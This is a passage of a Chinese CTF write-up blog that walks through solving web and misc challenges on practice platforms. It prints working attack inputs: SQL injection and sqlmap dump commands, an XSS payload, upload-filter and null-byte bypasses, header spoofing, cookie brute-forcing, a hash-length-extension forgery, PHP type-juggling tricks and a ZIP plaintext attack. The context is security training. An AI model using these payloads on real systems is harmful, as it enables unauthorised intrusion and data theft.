very close!</code></pre><p>没办法了，上网查Kindeditor v4.1.7 漏洞，找到一个路径泄露漏洞，在这个路径下</p><pre><code>/php/file_manager_json.php</code></pre><p>直接访问:</p><pre><code>url: http://218.76.35.75:65180/kindeditor/php/file_manager_json.php</code></pre><p>原始数据中获得json</p><pre><code>/var/www/html/Web/kind/kindeditor/attached&#123;&quot;moveup_dir_path&quot;: &quot;&quot;, &quot;current_dir_path&quot;: &quot;&quot;, &quot;current_url&quot;: &quot;/kindeditor/php/../attached/&quot;, &quot;total_count&quot;: 2, &quot;file_list&quot;: [    &#123;        &quot;is_dir&quot;: false,         &quot;has_file&quot;: false,         &quot;filesize&quot;: 51,         &quot;dir_path&quot;: &quot;&quot;,         &quot;is_photo&quot;: false,         &quot;filetype&quot;: &quot;php&quot;,         &quot;filename&quot;: &quot;flag_clue.php&quot;,         &quot;datetime&quot;: &quot;2015-11-16 21:58:28&quot;    &#125;,     &#123;        &quot;is_dir&quot;: false,         &quot;has_file&quot;: false,         &quot;filesize&quot;: 28,         &quot;dir_path&quot;: &quot;&quot;,         &quot;is_photo&quot;: false,         &quot;filetype&quot;: &quot;html&quot;,         &quot;filename&quot;: &quot;index.html&quot;,         &quot;datetime&quot;: &quot;2015-11-16 21:37:12&quot;    &#125;]</code></pre><p>}<br>发现在attached目录下有个flag_clue.php。直接访问获得</p><pre><code>=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ</code></pre><p>看样子是反转后的base64。用python翻转然后解码得:</p><pre><code>ZmxhZzp7dXZlRG9uZUFncmVhdEpvYn0=flag:&#123;uveDoneAgreatJob&#125;</code></pre><h2 id="default"><a href="#default" class="headerlink" title="default"></a>default</h2><p><a href="http://218.76.35.74:20131/" title="题目地址">题目地址</a></p><p>题目描述说</p><pre><code>描述：主页都没有了，就不要扫我了</code></pre><p>那就上扫描器吧2333，御剑扫一下发现有index1.php,访问得</p><pre><code>flag 在变量里!&lt;?php  error_reporting(0);include &quot;flag1.php&quot;;    highlight_file(__file__);if(isset($_GET[&#39;args&#39;]))&#123;    $args = $_GET[&#39;args&#39;];    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;        die(&quot;args error!&quot;);    &#125;    eval(&quot;var_dump($$args);&quot;);&#125;</code></pre><p>这题眼熟。。Bugku的Web-变量1.。</p><p>payload</p><pre><code>http://218.76.35.74:20131/index1.php?args=GLOBALS</code></pre><p>返回</p><pre><code>array(7) &#123; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag&#123;F8871804DD8C20C66D2386B3E51ADEC4&#125;&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; </code></pre><p>所以flag为</p><pre><code>flag&#123;F8871804DD8C20C66D2386B3E51ADEC4&#125;</code></pre><h2 id="DrinkCoffee"><a href="#DrinkCoffee" class="headerlink" title="DrinkCoffee"></a>DrinkCoffee</h2><p><a href="http://218.76.35.75:65280/" title="题目地址">题目地址</a></p><p>打开链接后有个提示</p><pre><code>Hint: Find the password to submit, but you should come from http://www.iie.ac.cn and your IP must be 10.10.20.1</code></pre><p>用burpsuite抓包，从响应包的头里面找到password</p><pre><code>Password: d2626f412da748e711ca4f4ae9428664</code></pre><p>解密得password是cafe,然后根据提示修改请求包</p><pre><code>X-Forwarded-For: 10.10.20.1Referer: http://www.iie.ac.cn</code></pre><p>Go一下获得flag</p><pre><code>&lt;script&gt;alert(&#39;Flag: 84294deb396ba4373c5ea8b73fa111b2&#39;);&lt;/script&gt;</code></pre><p>flag为</p><pre><code>Flag: 84294deb396ba4373c5ea8b73fa111b2</code></pre><h2 id="简单的JS"><a href="#简单的JS" class="headerlink" title="简单的JS"></a>简单的JS</h2><p><a href="http://218.76.35.75:20123/" title="题目地址">题目地址</a></p><p>打开题目连接，发现有提示</p><pre><code>The evil url is the passkey </code></pre><p>右键查看源代码，有一段JS</p><pre><code>p = &quot;60,105,102,114,97,109,101,32,104,101,105,103,104,116,61,48,32,119,105,100,116,104,61,48,32,115,114,99,61,34,46,47,102,108,48,97,46,112,104,112,34,62&quot;p = eval(&quot;String.fromCharCode(&quot; + p + &quot;)&quot;);document.write(p);</code></pre><p>直接运行并不出啥结果。。加一句</p><pre><code>alert(p);</code></pre><p>弹出    </p><pre><code>&lt;iframe height=0 width=0 src=&quot;./fl0a.php&quot;&gt;</code></pre><p>访问</p><pre><code>http://218.76.35.75:20123/fl0a.php</code></pre><p>显示</p><pre><code>flag is $flag</code></pre><p>抓包，在cookie上发现flag</p><pre><code>Cookie: flag=C00k1els60SecU5e</code></pre><h2 id="简单的文件上传"><a href="#简单的文件上传" class="headerlink" title="简单的文件上传"></a>简单的文件上传</h2><p><a href="http://218.76.35.75:20122/" title="题目地址">题目地址</a></p><p>这题做的我一脸懵逼。。</p><p>首先随便传了张jpg的图，提示</p><pre><code>upload success,but not php!</code></pre><p>然后传了个php</p><pre><code>only accept jpg file~</code></pre><p>试了试各种绕过，没成功。。然后抱着试试的心态改了下Content-Type，flag出来了。。这咋回事啊。</p><p>经过测试，解题方法为，上传一个.php文件，然后在burpsuite中，改一下Content-Type即可</p><pre><code>Content-Type: application/octet-stream</code></pre><p>改为</p><pre><code>Content-Type: image/jpeg</code></pre><p>即可</p><p>flag为</p><pre><code>upload Success!flag:Upl00d30668ss9h97aFil3</code></pre><h2 id="php是门松散的语言"><a href="#php是门松散的语言" class="headerlink" title="php是门松散的语言"></a>php是门松散的语言</h2><p><a href="http://218.76.35.75:20124/" title="题目地址">题目地址</a></p><p>看代码</p><pre><code>- - - - - - - source code - - - - - - - - - -$he =&#39;goodluck&#39;;parse_str($_GET[&#39;heetian&#39;]);if $he = &#39;abcd&#39;;echo $flag;he=?</code></pre><p>payload:</p><pre><code>http://218.76.35.75:20124/?heetian=he=abcd</code></pre><p>flag为</p><pre><code>flag:C00d1uckf0rY0uuu</code></pre><h2 id="试试XSS"><a href="#试试XSS" class="headerlink" title="试试XSS"></a>试试XSS</h2><p><a href="http://218.76.35.75:20125/" title="题目地址">题目地址</a></p><p>点开链接，有提示</p><pre><code>Hint: alert document.domain.</code></pre><p>随便提交一个123</p><p>然后右键查看源代码，有个img标签</p><pre><code>&lt;img src=&#39;123 /&gt;&lt;/form&gt;</code></pre><p>构造代码闭合<br>    &lt;img src=’233’onclick=alert(document.domain)/&gt;</form><br>提交</p><pre><code>233&#39;onclick=alert(document.domain)</code></pre><p>然后点击一下页面上出现的图片，但是弹出了一个IP。。</p><pre><code>218.76.35.75</code></pre><p>document.domain是指当前域名，并不是flag。不过这几天我XSS没白学,于是乎试了下另一种</p><pre><code>233&#39;onerror=alert(document.domain)</code></pre><p>我去。。flag出来了，再提交试试。。又不出来了。。<br>后经表哥提醒，单引号后面少个空格，最终是</p><pre><code>233&#39; onerror=alert(document.domain)</code></pre><p>flag为</p><pre><code>flag:D0Gum6Ntd0M11n</code></pre><p>看样子我有次提交时多加了个空格23333</p><h2 id="简单的验证"><a href="#简单的验证" class="headerlink" title="简单的验证"></a>简单的验证</h2><p><a href="http://218.76.35.75:20127/" title="题目地址">题目地址</a></p><p>打开题目后</p><pre><code>To the world you may be just somebodyim not admin~</code></pre><p>抓包，在cookies中发现</p><pre><code>Cookie: flag=C00k1els60SecU5e; user=Bob; guess=999</code></pre><p>这个flag是之前那个题的。。不知为啥现在还有，不过增加了user和guess这两个键值对。猜测是当user=admin&amp;guess=xxx时获得flag。<br>不写脚本了，直接用burpsuite的intruder模块爆破。。</p><p>将user的值改为admin，然后爆破guess的值，设定1-5000，步进为1.</p><pre><code>Cookie: flag=C00k1els60SecU5e; user=admin; guess=§999§</code></pre><p>根据响应包的长度变化来判断。当guess=573时，获得flag</p><pre><code>but to somebody you may just be the world&lt;p&gt;&lt;/p&gt;flag:EaSy70Ch1ngG00kie</code></pre><p>burpsuite果然是神器。</p><h2 id="简单的文件包含"><a href="#简单的文件包含" class="headerlink" title="简单的文件包含"></a>简单的文件包含</h2><p><a href="http://218.76.35.75:20126/" title="题目地址">题目地址</a></p><p>题目提示：</p><pre><code>Flag 在/flag</code></pre><p>打开网页后，有四个页面，依靠page参数链接。这提示太明显了，令page=/flag,右键查看源代码，获得flag</p><pre><code> flag 不在这里&lt;!-- flag: 62a72cb2f3d5e7fc0284da9f21e66c9f.php--&gt;&lt;/body&gt;</code></pre><p>访问获得flag:</p><pre><code>F11elNcLud3Get</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验吧部分题目Writeup</title>
    <link href="/2017/10/10/%E5%AE%9E%E9%AA%8C%E5%90%A7%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/"/>
    <url>/2017/10/10/%E5%AE%9E%E9%AA%8C%E5%90%A7%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/</url>
    
    <content type="html"><![CDATA[<p>持续更新中。。</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><p>地址：<a href="http://ctf5.shiyanbar.com/10/upload/" title="题目地址">http://ctf5.shiyanbar.com/10/upload/</a></p><p>进入后，右键查看源代码</p><pre><code>&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt;</code></pre><p>发现有两条不正常的信息，或许存在备份文件泄露。<br>然后尝试提交<a href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#115;&#105;&#x6d;&#x70;&#108;&#101;&#120;&#x75;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#115;&#105;&#x6d;&#x70;&#108;&#101;&#120;&#x75;&#x65;&#x2e;&#99;&#111;&#x6d;</a><br>提示</p><pre><code>“邮件发到管理员邮箱了，你看不到的”</code></pre><p>那我瞎填总行吧，随便填123<br>提示</p><pre><code>你邮箱收到的重置密码链接为 ./step2.php?email=youmail@mail.com&amp;check=???????</code></pre><p>接下来尝试”.step1.swp””.step2.swp”,都是404。</p><p>再用BurpSuite抓了下step2的包，在响应包中发现了</p><pre><code>&lt;form action=&quot;submit.php&quot; method=&quot;GET&quot;&gt;    &lt;h1&gt;找回密码step2&lt;/h1&gt;    email:&lt;input name=&quot;emailAddress&quot; type=&quot;text&quot; value=&quot;admin@simplexue.com&quot;  disable=&quot;true&quot;/&gt;&lt;/br&gt;    token:&lt;input name=&quot;token&quot; type=&quot;text&quot; /&gt;&lt;/br&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;</code></pre><p>尝试访问</p><blockquote><p><a href="http://ctf5.shiyanbar.com/10/upload/.submit.php.swp">http://ctf5.shiyanbar.com/10/upload/.submit.php.swp</a></p></blockquote><p>获得源代码</p><pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress))&#123;    if(strlen($token)!=10) die(&#39;fail&#39;);    if($token!=&#39;0&#39;) die(&#39;fail&#39;);    $sql = &quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&quot;;    $r = mysql_query($sql) or die(&#39;db error&#39;);    $r = mysql_fetch_assoc($r);    $r = $r[&#39;num&#39;];    if($r&gt;0)&#123;        echo $flag;    &#125;else&#123;        echo &quot;澶辫触浜嗗憖&quot;;    &#125;&#125;</code></pre><p>由此可知，只有token的值为0且长度为10，才可以通过验证。<br>于是乎构造payload：</p><pre><code>http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0e12345678</code></pre><p>获得flag:</p><pre><code>flag is SimCTF&#123;huachuan_TdsWX&#125;</code></pre><h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p><a href="http://ctf5.shiyanbar.com/web/more.php">题目地址</a></p><p>直接给了代码进行审计</p><pre><code>&lt;?phpif (isset ($_GET[&#39;password&#39;])) &#123;    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    &#123;        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    &#125;    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    &#123;        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)        &#123;            die(&#39;Flag: &#39; . $flag);        &#125;        else        &#123;            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        &#125;    &#125;    else    &#123;        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>要拿到flag需要满足三个条件</p><pre><code>1. 输入的password只能由字母和数字构成2. 输入的password的长度要小于8并且值要大于99999993. 输入的password中还有*-*这一串字符</code></pre><p>根据提示</p><pre><code>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。</code></pre><p>ereg()函数可用%00截断，使用科学计数法可满足条件2</p><p>于是，构造</p><pre><code> ?password=9e9%00*-*</code></pre><p>提交获flag</p><pre><code>Flag: CTF&#123;Ch3ck_anD_Ch3ck&#125;</code></pre><h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p><a href="http://ctf5.shiyanbar.com/web/kzhan.php">题目地址</a></p><p>使用burp抓一下包，在cookie这个键值对中，有个source=0,将其改为1，再次提交，即可获得源码。</p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        &#125;        else &#123;            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);        &#125;    &#125;    else &#123;        die (&quot;You are not an admin! LEAVE.&quot;);    &#125;&#125;setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) &#123;    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));&#125;else &#123;    if ($_COOKIE[&quot;source&quot;] != 0) &#123;        echo &quot;&quot;; // This source code is outputted here    &#125;&#125;</code></pre><p>利用hash长度扩展攻击</p><p>使用hashpump生成</p><pre><code>liwenhu@ubuntu:~$ hashpumpInput Signature: 571580b26c65f306376d4f64e53cb5c7Input Data: adminInput Key Length: 20Input Data to Add: mengchen3bc397b2d7cb24c2be94db03cfd10b62admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00mengchen</code></pre><p>因此令</p><pre><code>Cookies:getmein=3bc397b2d7cb24c2be94db03cfd10b62username=adminpassword=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00mengchen</code></pre><p>提交即可</p><pre><code>Congratulations! You are a registered user.The flag is CTF&#123;cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther&#125;</code></pre><h2 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h2><p><a href="http://ctf5.shiyanbar.com/web/index_3.php">题目地址</a></p><p>神器SQlmap</p><p>注库名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=123&quot; --dbs --level 5</code></pre><p>回显</p><pre><code>available databases [3]:[*] information_schema[*] test[*] web1</code></pre><p>注表名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=123&quot; -D &quot;web1&quot; --tables --level 5</code></pre><p>回显</p><pre><code>Database: web1[2 tables]+-------+| flag  || web_1 |+-------+</code></pre><p>注字段</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=123&quot; -D &quot;web1&quot; -T &quot;flag&quot; --columns --level 5</code></pre><p>回显<br>    Database: web1<br>    Table: flag<br>    [2 columns]<br>    +——–+———-+<br>    | Column | Type     |<br>    +——–+———-+<br>    | flag   | char(30) |<br>    | id     | int(4)   |<br>    +——–+———-+</p><p>注内容</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=123&quot; -D &quot;web1&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump --level 5</code></pre><p>回显</p><pre><code>Database: web1Table: flag[1 entry]+----------------------------+| flag                       |+----------------------------+| flag&#123;Y0u_@r3_5O_dAmn_90Od&#125; |+----------------------------+</code></pre><p>获得flag为</p><pre><code>flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;</code></pre><h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p><a href="http://ctf5.shiyanbar.com/sHeader/">题目地址</a></p><p>进入之后给了提示,需要满足三个条件</p><pre><code>1. 安装 .NET 9.92. 使用IE浏览器访问3. 要在英国</code></pre><p>根据提示和题目名称呢，可以判断要修改http头</p><p>于是乎构造</p><pre><code>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9Accept-Language: en-gb;</code></pre><p>通过burpsuite修改HTTP请求包即可获得flag</p><pre><code>The key is:HTTpH34der</code></pre><h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><p><a href="http://ctf5.shiyanbar.com/web/5/index.php">题目地址</a></p><p>直接访问index.txt，可以获得源代码</p><?php    if($_POST[user] && $_POST[pass]) {        $conn = mysql_connect("********, "*****", "********");        mysql_select_db("phpformysql") or die("Could no    select database");        if ($conn->connect_error) {            die("Connection failed: " . mysql_error($conn));    }     $user = $_POST[user];    $pass = md5($_POST[pass]);    $sql = "select pw from php where user='$user'";    $query = mysql_query($sql);    if (!$query) {        printf("Error: %s\n", mysql_error($conn));        exit();    }    $row = mysql_fetch_array($query, MYSQL_ASSOC);    //echo $row["pw"];        if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {        echo "<p>Logged in! Key:************** </p>";    }    else{        echo("<p>Log in failure!</p>");        }      }    ?><p>审计一下代码，最关键的是</p><pre><code>strcasecmp($pass, $row[pw])</code></pre><p>构造payload</p><pre><code>user=&#39;and 1=0 union select md5(233) #&amp;pass=233</code></pre><p>提交即可获得Flag</p><pre><code>Logged in! Key: SimCTF&#123;youhaocongming&#125; </code></pre><h2 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h2><p><a href="http://ctf5.shiyanbar.com/basic/inject">题目地址</a></p><p>上神器SQLmap</p><p>注库名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login&quot; --dbs --level 5</code></pre><p>回显</p><pre><code>available databases [2]:[*] information_schema[*] test</code></pre><p>注表名</p><pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login&quot; -D &quot;test&quot; --tables --level 5</code></pre><p>回显</p><pre><code>Database: test[1 table]+-------+| admin |+-------+</code></pre><p>注字段名</p><pre><code> sqlmap -u &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login&quot; -D &quot;test&quot; -T &quot;admin&quot; --columns --level 5</code></pre><p>回显</p><pre><code>Database: test                Table: admin                  [2 columns]                   +----------+--------------+   | Column   | Type         |   +----------+--------------+   | password | varchar(100) |   | username | varchar(100) |   +----------+--------------+                             </code></pre><p>直接注密码内容</p><pre><code> sqlmap -u &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login&quot; -D &quot;test&quot; -T &quot;admin&quot; -C &quot;password&quot; --dump --level 5</code></pre><p>回显</p><pre><code>Database: testTable: admin[1 entry]+----------+| password |+----------+| idnuenna |+----------+</code></pre><p>直接登录即可获得flag，</p><pre><code>账号 admin 密码 idnuenna</code></pre><p>获得key</p><pre><code>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM</code></pre><h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php">题目地址</a></p><p>进去后有提示</p><pre><code>Can you authenticate to this website? index.php.txt </code></pre><p>直接访问</p><pre><code>http://ctf5.shiyanbar.com/DUTCTF/index.php.txt</code></pre><p>发现源码</p><pre><code>&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123;  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt;</code></pre><p>根据代码，要将hackerDJ进行两次url编码才可满足两个条件</p><pre><code>hackerDJ %68%61%63%6B%65%72%44%4A%2568%2561%2563%256B%2565%2572%2544%254A</code></pre><p>提交即可获得flag</p><pre><code>http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</code></pre><p>回显</p><pre><code>Access granted!flag: DUTCTF&#123;PHP_is_the_best_program_language&#125;</code></pre><h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p>题目直接给了源代码</p><pre><code>&lt;?phpif (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) &#123;    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;&#125;else&#123;    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;?&gt;</code></pre><p>此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，FALSE===FALSE是成立的。于是乎</p><pre><code>http://ctf5.shiyanbar.com/web/false.php?name[]=123&amp;password[]=2</code></pre><p>获得flag</p><pre><code>Flag: CTF&#123;t3st_th3_Sha1&#125;</code></pre><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><a href="http://ctf5.shiyanbar.com/web/upload">题目地址</a></p><p>00截断绕过，直接看图</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-1.png"></p><p>flag为</p><pre><code>flag&#123;SimCTF_huachuan&#125;</code></pre><h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p><a href="http://ctf5.shiyanbar.com/web/web200.jpg">题目地址</a></p><p>简单的加密，写个小脚本跑一下即可</p><pre><code>#!python3#-*-coding:utf-8-*-import base64text = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;s = &quot;&quot;#rot13for i in text:    if(ord(i) &lt;= 122 and ord(i) &gt;= 97):        x = ord(i) + 13        if(x &gt; 122):            x = x - 26    elif(ord(i) &lt;= 90 and ord(i) &gt;= 65):        x = ord(i) + 13        if(x &gt; 90):            x = x - 26    else:        s+=i        continue    s += chr(x)print(s)s = s[::-1]print(s)s = base64.b64decode(s)print(s)re = &quot;&quot;s = str(s)for i in s:    x = chr(ord(i) - 1)    re += xre = re[::-1]print(re)</code></pre><p>最后flag为</p><pre><code>&amp;flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;&amp;a</code></pre><h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p>根据代码提示，加一个XFF头即可</p><p>如图</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web-%E8%B2%8C%E4%BC%BC%E6%9C%89%E7%82%B9%E9%9A%BE-1.png"></p><p>flag为</p><pre><code>SimCTF&#123;daima_shengji&#125;</code></pre><h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p>直接右键看源代码，有提示</p><pre><code>&lt;!-- $test=$_GET[&#39;username&#39;]; $test=md5($test); if($test==&#39;0&#39;) --&gt;</code></pre><p>找一个MD5值为0e开头的即可，网上随便找一个</p><pre><code>s155964671a</code></pre><p>提示</p><pre><code>/user.php?fame=hjkleffifer</code></pre><p>提交访问后，又给了一串代码</p><pre><code>&lt;?php$unserialize_str = $_POST[&#39;password&#39;];$data_unserialize = unserialize($unserialize_str);if ($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;] == &#39;???&#39;) &#123;    print_r($flag);&#125;伟大的科学家php方言道：成也布尔，败也布尔。回去吧骚年 .?&gt;</code></pre><p>还有提示，其实这里考察了PHP中布尔类型中的true可以与任意字符串弱类型相等，构造序列化字符串为</p><pre><code>a:2:&#123;s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;&#125;</code></pre><p>在密码那一栏提交即可获得flag</p><pre><code>ctf&#123;dwduwkhduw5465&#125;</code></pre><h1 id="安全杂项"><a href="#安全杂项" class="headerlink" title="安全杂项"></a>安全杂项</h1><h2 id="deeeeeeaaaaaadbeeeeeeeeeef-200"><a href="#deeeeeeaaaaaadbeeeeeeeeeef-200" class="headerlink" title="deeeeeeaaaaaadbeeeeeeeeeef-200"></a>deeeeeeaaaaaadbeeeeeeeeeef-200</h2><p>把图片下载下来，尝试了各种姿势无果。然后用tweakpng检查一下文件，提示</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-deeeeee-1.png"></p><p>按照图示将其修改，把图片的高改长一点，发现flag、</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-deeeeee-2.png"></p><p>flag为</p><pre><code>key&#123;TheISISPasswordIs&#125;</code></pre><h2 id="这就是一个坑"><a href="#这就是一个坑" class="headerlink" title="这就是一个坑"></a>这就是一个坑</h2><p>给了一个压缩包和一个文档，压缩包中也有一个加密的文档，很明显就是明文攻击，直接上工具</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-%E8%BF%99%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9D%91-1.png"></p><p>最后有坑，爆出来的密码最后几位是空格</p><p>flag为</p><pre><code>flag&#123;Mtf1y@    &#125;</code></pre><h2 id="紧急报文"><a href="#紧急报文" class="headerlink" title="紧急报文"></a>紧急报文</h2><p>题目描述</p><pre><code>解密一下这份截获的密文吧，时间就是机会！FA XX DD AG FF XG FD XG DD DG GA XF FAflag格式:flag_Xd&#123;hSh_ctf:******&#125;</code></pre><p>百度可知一种报文密码–ADFGX密码</p><p>密码表为</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E7%B4%A7%E6%80%A5%E6%8A%A5%E6%96%87-1.png"></p><p>一一对应即可获得flag，为</p><pre><code>flag_Xd&#123;hSh_ctf:flagxidianctf&#125;</code></pre><h2 id="图片里的动漫"><a href="#图片里的动漫" class="headerlink" title="图片里的动漫"></a>图片里的动漫</h2><p><a href="http://ctf5.shiyanbar.com/misc/acg.jpg">题目地址</a></p><p>题目描述</p><pre><code> 一恒河沙中有三千世界，一张图里也可以有很多东西。答案是与一部动漫名字有关的小写英文字母。flag格式：CTF&#123;xxx&#125;</code></pre><p>这题挺奇葩的。。给的图片直接改扩展名为rar,可以解压出一个flag.rar,打开后里面有个带密码的flag.txt文件。不是伪加密，也爆破不开。。</p><p>不过扔到kali里面使用binwalk分析一下发现有jpeg的文件头</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%9B%BE%E7%89%87%E9%87%8C%E7%9A%84%E5%8A%A8%E6%BC%AB-1.png"></p><p>尝试将扩展名改为jpeg，获得一张动漫的图，百度识图一下，是七龙珠。<br>再结合下面评论的提示</p><pre><code>flag就是 CTF&#123;动漫名字的逆置&#125;</code></pre><p>《龙珠》英文名字（DRAGON BALL）</p><p>因此flag为</p><pre><code>CTF&#123;llabnogard&#125;</code></pre><h2 